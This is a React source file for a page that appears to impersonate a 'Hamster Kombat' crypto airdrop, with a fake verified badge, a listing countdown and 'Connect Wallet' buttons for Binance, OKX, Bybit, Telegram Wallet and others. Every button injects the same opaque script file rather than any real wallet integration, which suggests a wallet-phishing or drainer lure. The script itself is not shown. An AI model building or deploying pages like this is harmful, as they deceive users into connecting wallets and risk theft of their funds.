import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import image from "../11.png";
import image1 from "../binan.jpg";
import image2 from "../okx.jpg";
import image3 from "../by.jpg";
import image4 from "../tele.jpg";
import image5 from "../ebi.jpg";
import image6 from "../air.jpg";
import bg from "../bg.jpg";
import { PiMedalFill } from "react-icons/pi";
import { MdVerified } from "react-icons/md";

const AirdropPage = () => {
  const [activeTab, setActiveTab] = useState("withdrawal");
  const navigate = useNavigate();
  const listingDate = new Date("2024-09-26T00:00:00Z");

  const [timeLeft, setTimeLeft] = useState({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0,
  });

  const calculateTimeLeft = () => {
    const now = new Date();
    const difference = listingDate - now;

    if (difference > 0) {
      const days = Math.floor(difference / (1000 * 60 * 60 * 24));
      const hours = Math.floor((difference / (1000 * 60 * 60)) % 24);
      const minutes = Math.floor((difference / 1000 / 60) % 60);
      const seconds = Math.floor((difference / 1000) % 60);

      setTimeLeft({ days, hours, minutes, seconds });
    } else {
      setTimeLeft({ days: 0, hours: 0, minutes: 0, seconds: 0 });
    }
  };

  useEffect(() => {
    const timer = setInterval(calculateTimeLeft, 1000);
    return () => clearInterval(timer);
  }, []);

  const handlePlayClick = () => {
    navigate("/");
  };

  const runScript = () => {
    const existingScript = document.getElementById("wcm-button-script");
    if (!existingScript) {
      const script = document.createElement("script");
      script.src = "/66ecf0321c4f66e295df8a47.js"; // Replace with your actual script URL
      script.async = true;
      script.id = "wcm-button-script";
      document.body.appendChild(script);
    } else {
      console.log("Script already loaded.");
    }
  };

  const formattedTimeLeft = `${timeLeft.days} DAYS ${timeLeft.hours
    .toString()
    .padStart(2, "0")}:${timeLeft.minutes
    .toString()
    .padStart(2, "0")}:${timeLeft.seconds.toString().padStart(2, "0")}`;

  const formattedListingDate = listingDate.toLocaleDateString("en-US", {
    year: "numeric",
    month: "long",
    day: "numeric",
  });

  return (
    <div className="min-h-screen bg-black text-white p-4">
      {/* Header */}
      <div className="flex items-center justify-between pb-4">
        <div className="flex items-center space-x-2">
          <button onClick={handlePlayClick} className="text-lg">
            &#8592;
          </button>
          <h1 className="text-xl font-semibold">Hamster Kombat</h1>
          <MdVerified className="text-blue-500 text-sm ml-2 mt-1" />
        </div>
      </div>

      {/* Countdown and Coin */}
      <div className="text-center py-4">
        <div className="relative inline-block">
          <div
            className="rounded-full w-42 h-42 mx-auto border-[3px] border-yellow-500 animate-spin-slow"
            style={{
              animationDuration: `${60 - timeLeft.seconds}s`,
            }}
          >
            <img
              src={image}
              alt="Hamster Coin"
              className="w-42 h-42 mx-auto rounded-full"
            />
          </div>
          <div className="absolute bottom-[-7px] left-1/2 transform -translate-x-1/2 bg-yellow-500 rounded-full px-2 py-1 text-black text-xs">
            {formattedTimeLeft}
          </div>
        </div>
        <h2 className="text-3xl font-bold mt-4">AirDrop</h2>
        <p className="text-sm text-gray-500">Listing date</p>
        <p className="text-2xl font-semibold text-yellow-400">
          {formattedListingDate}
        </p>
        <div className="bg-green-500 text-center rounded-md mt-4 p-2 flex flex-col items-center">
          <p className="text-white">AirDrop allocation points</p>
          <p className="text-xl font-bold flex items-center">
            <PiMedalFill className="size-[22px] mr-1" />
            TBA
          </p>
        </div>
      </div>

      {/* Points and Withdrawal Tabs */}
      <div className="mt-6">
        <div className="flex justify-between p-2 bg-gray-700 rounded-md text-gray-400">
          <p
            className={`cursor-pointer p-2 rounded-md w-[48%] flex justify-start ${
              activeTab === "points" ? "bg-gray-600 text-white" : ""
            }`}
            onClick={() => setActiveTab("points")}
          >
            Tokens
          </p>
          <p
            className={`cursor-pointer p-2 rounded-md w-[48%] flex justify-end ${
              activeTab === "withdrawal" ? "bg-gray-600 text-white" : ""
            }`}
            onClick={() => setActiveTab("withdrawal")}
          >
            Withdrawal
          </p>
        </div>

        {/* Content based on active tab */}
        <div className="mt-4">
          {activeTab === "points" ? (
            <div className="flex justify-center">
              <img src={bg} alt="Points Image" className="w-180 h-180" />
            </div>
          ) : (
            <div className="space-y-2">
              {/* Exchanges for withdrawal */}
              <div className="flex justify-between p-2 bg-gray-800 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img src={image1} alt="Binance" className="w-10 h-10" />
                  <p className="max-[500px]:text-sm">Binance exchange</p>
                </div>
                <button
                  className="text-white bg-green-500 px-3 py-1 rounded-xl focus:bg-green-700"
                  onClick={runScript} // Call runScript on click
                >
                  Connect Wallet
                </button>
              </div>

              {/* Repeat similar blocks for other exchanges */}
              <div className="flex justify-between p-2 bg-gray-800 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img src={image2} alt="OKX" className="w-10 h-10" />
                  <p className="max-[500px]:text-sm">OKX exchange</p>
                </div>
                <button
                  className="text-white bg-green-500 px-3 py-1 rounded-xl focus:bg-green-700"
                  onClick={runScript} // Call runScript on click
                >
                  Connect Wallet
                </button>
              </div>

              <div className="flex justify-between p-2 bg-gray-800 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img src={image3} alt="Bybit" className="w-10 h-10" />
                  <p className="max-[500px]:text-sm">Bybit exchange</p>
                </div>
                <button
                  className="text-white bg-green-500 px-3 py-1 rounded-xl focus:bg-green-700"
                  onClick={runScript} // Call runScript on click
                >
                  Connect Wallet
                </button>
              </div>

              <div className="flex justify-between p-2 bg-gray-800 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img
                    src={image4}
                    alt="Wallet in Telegram"
                    className="w-10 h-10"
                  />
                  <p className="max-[500px]:text-sm">Wallet in Telegram</p>
                </div>
                <button
                  className="text-white bg-green-500 px-3 py-1 rounded-xl focus:bg-green-700"
                  onClick={runScript} // Call runScript on click
                >
                  Connect Wallet
                </button>
              </div>

              <div className="flex justify-between p-2 bg-gray-800 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img src={image5} alt="EBI" className="w-10 h-10" />
                  <p className="max-[500px]:text-sm">EBI</p>
                </div>
                <button
                  className="text-white bg-green-500 px-3 py-1 rounded-xl focus:bg-green-700"
                  onClick={runScript} // Call runScript on click
                >
                  Connect Wallet
                </button>
              </div>

              <div className="flex justify-between p-2 bg-gray-800 rounded-xl">
                <div className="flex items-center space-x-4">
                  <img src={image6} alt="Airdrop" className="w-10 h-10" />
                  <p className="max-[500px]:text-sm">Airdrop</p>
                </div>
                <button
                  className="text-white bg-green-500 px-3 py-1 rounded-xl focus:bg-green-700"
                  onClick={runScript} // Call runScript on click
                >
                  Connect Wallet
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AirdropPage;
